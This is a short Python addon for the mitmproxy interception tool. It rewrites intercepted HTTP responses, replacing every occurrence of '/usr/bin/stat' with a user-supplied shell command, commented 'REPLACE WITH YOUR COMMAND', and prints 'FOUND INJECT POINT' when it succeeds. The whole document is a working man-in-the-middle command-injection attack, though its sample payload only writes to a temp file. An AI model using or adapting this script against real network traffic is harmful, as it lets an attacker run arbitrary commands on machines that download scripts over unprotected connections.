from mitmproxy import http
def response(flow: http.HTTPFlow) -> None:
    # The exact string to search for.
    target = '/usr/bin/stat'
    replacement = 'echo 1 > /tmp/whatever;' #REPLACE WITH YOUR COMMAND
    text = flow.response.get_text()
    if target in text:
        print("FOUND INJECT POINT")
        new_text = text.replace(target, replacement)
        flow.response.set_text(new_text)
